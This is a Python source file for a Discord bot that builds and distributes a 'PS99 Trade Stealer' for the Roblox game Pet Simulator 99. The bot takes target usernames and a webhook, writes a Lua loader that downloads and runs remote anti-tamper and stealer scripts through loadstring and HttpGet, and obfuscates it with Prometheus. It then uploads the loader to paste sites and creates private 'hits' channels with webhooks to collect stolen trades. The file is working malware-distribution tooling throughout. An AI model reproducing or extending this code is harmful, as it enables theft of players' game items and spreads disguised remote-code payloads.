import discord
from discord.ext import commands
import requests
import os
import json
import asyncio
import subprocess
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("TOKEN")
PASTEFY_API_KEY = os.getenv("PASTEFY_API_KEY")

# ==================== URLs - CHANGE THESE ====================
ANTI_TAMPER_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/ps99-trade-stealer/main/anti-tamper.lua"
PS99_STEALER_URL = "https://raw.githubusercontent.com/YOUR_USERNAME/ps99-trade-stealer/main/main-stealer.lua"

PROMETHEUS_DIR = "Prometheus"

def setup_prometheus():
    if not os.path.exists(PROMETHEUS_DIR):
        print("Cloning Prometheus Obfuscator...")
        try:
            subprocess.run(["git", "clone", "--depth", "1", "https://github.com/prometheus-lua/Prometheus.git", PROMETHEUS_DIR], check=True)
            print("✅ Prometheus cloned.")
        except Exception as e:
            print(f"Failed to clone Prometheus: {e}")
    else:
        print("Prometheus already exists.")

def obfuscate_with_prometheus(script_content: str) -> str:
    try:
        with open("temp_loader.lua", "w", encoding="utf-8") as f:
            f.write(script_content)
        
        result = subprocess.run([
            "lua", 
            f"{PROMETHEUS_DIR}/cli.lua", 
            "--preset", "Strong",
            "temp_loader.lua"
        ], capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0 and os.path.exists("temp_loader.lua.obfuscated.lua"):
            with open("temp_loader.lua.obfuscated.lua", "r", encoding="utf-8") as f:
                return f.read()
        else:
            print("Prometheus warning:", result.stderr)
            return script_content
    except Exception as e:
        print(f"Obfuscation failed: {e}")
        return script_content
    finally:
        for file in ["temp_loader.lua", "temp_loader.lua.obfuscated.lua"]:
            if os.path.exists(file):
                os.remove(file)

# ------------------------ Progress Bar ------------------------
async def send_progress(interaction: discord.Interaction, title: str):
    embed = discord.Embed(title=title, description="`[□□□□□□□□□□] 0%`", color=0x2ecc71)
    msg = await interaction.followup.send(embed=embed, ephemeral=True)
    for i in range(1, 11):
        bar = "■" * i + "□" * (10 - i)
        embed.description = f"`[{bar}] {i * 10}%`"
        await msg.edit(embed=embed)
        await asyncio.sleep(0.12)
    return msg

# ------------------------ Upload Script ------------------------
def upload_script(content: str) -> str:
    try:
        if PASTEFY_API_KEY:
            headers = {"Authorization": f"Bearer {PASTEFY_API_KEY}", "Content-Type": "application/json"}
            payload = {"title": "ps99_trade.lua", "content": content, "visibility": "UNLISTED"}
            r = requests.post("https://pastefy.app/api/v2/paste", json=payload, headers=headers, timeout=10)
            if r.status_code == 200 and "paste" in r.json():
                return r.json()["paste"]["raw_url"]
    except: pass

    try:
        r = requests.post("https://hastebin.com/documents", data=content.encode(), timeout=7)
        if r.status_code == 200 and "key" in r.json():
            return f"https://hastebin.com/raw/{r.json()['key']}"
    except: pass
    return None

# ------------------------ Private Channel + Webhook ------------------------
async def create_private_channel_and_webhook(member: discord.Member, guild: discord.Guild):
    category = next((c for c in guild.categories if c.name.startswith("USERS") and len(c.channels) < 50), None)
    if not category:
        num = sum(1 for c in guild.categories if c.name.startswith("USERS")) + 1
        category = await guild.create_category(f"USERS{num}")
        await category.set_permissions(guild.default_role, view_channel=False)

    safe_name = "".join(ch for ch in member.display_name.lower() if ch.isalnum() or ch in "-_")[:32]
    channel = await guild.create_text_channel(safe_name, category=category)
    await channel.set_permissions(member, view_channel=True)
    await channel.send("Your PS99 Trade Hits will appear here! 🐾")

    webhook = await channel.create_webhook(name=f"{member.name}-ps99")
    return webhook.url, channel

# ------------------------ UI ------------------------
class PS99Button(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=180)

    @discord.ui.button(label="PS99 Trade Stealer", style=discord.ButtonStyle.danger, emoji="🔄")
    async def ps99_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(PS99Modal())

class PS99Modal(discord.ui.Modal, title="PS99 Trade Stealer Config"):
    usernames = discord.ui.TextInput(label="Roblox Usernames", placeholder="user1,user2,user3", required=True)
    min_value = discord.ui.TextInput(label="Minimum Trade Value", default="1000000", required=True)
    webhook = discord.ui.TextInput(label="Webhook URL (optional)", placeholder="Leave empty for private channel", required=False)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        await generate_ps99_script(interaction, self.usernames.value, self.min_value.value, self.webhook.value or None)

# ------------------------ Generator ------------------------
async def generate_ps99_script(interaction, usernames_raw, min_value, webhook):
    users = [u.strip().strip("\"'") for u in usernames_raw.split(",") if u.strip()]
    if not users:
        return await interaction.followup.send("⚠ You must provide at least one username.", ephemeral=True)

    final_webhook = webhook
    channel_link = None
    if not webhook:
        final_webhook, channel = await create_private_channel_and_webhook(interaction.user, interaction.guild)
        channel_link = channel.mention

    lua_users = ", ".join(f'"{u}"' for u in users)

    loader = f'''-- babageyus PS99 Trade Stealer
loadstring(game:HttpGet("{ANTI_TAMPER_URL}", true))()

_G.BabageyusTradeConfig = {{
    usernames = {{ {lua_users} }},
    min_value = {min_value},
    webhook = "{final_webhook}"
}}

loadstring(game:HttpGet("{PS99_STEALER_URL}", true))()
'''

    msg = await send_progress(interaction, "Generating & Obfuscating...")

    obfuscated = obfuscate_with_prometheus(loader)
    raw = upload_script(obfuscated)
    loadstring_code = f'loadstring(game:HttpGet("{raw}", true))()' if raw else obfuscated

    embed = discord.Embed(title="PS99 Trade Stealer Ready! 🛡️", color=0x2ecc71)
    embed.add_field(name="Targets", value=", ".join(users[:10]), inline=False)
    embed.add_field(name="Min. Value", value=min_value, inline=True)
    embed.add_field(name="Loadstring", value=f"```lua\n{loadstring_code}\n```", inline=False)
    if channel_link:
        embed.add_field(name="Hits Channel", value=channel_link, inline=False)

    class Copy(discord.ui.View):
        @discord.ui.button(label="Copy Loadstring", style=discord.ButtonStyle.success, emoji="📋")
        async def copy_btn(self, i, b):
            await i.response.send_message(f"```lua\n{loadstring_code}\n```", ephemeral=True)

    await msg.edit(embed=embed, view=Copy())

# ------------------------ Command ------------------------
@tree.command(name="ps99", description="Generate PS99 Trade Stealer")
async def ps99_cmd(interaction: discord.Interaction):
    await interaction.response.send_message("Preparing PS99 Trade Stealer...", view=PS99Button(), ephemeral=True)

# ------------------------ Ready ------------------------
@bot.event
async def on_ready():
    setup_prometheus()
    print(f"✅ Bot started as {bot.user}")
    synced = await tree.sync()
    print(f"Synced {len(synced)} commands")

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

bot.run(TOKEN)
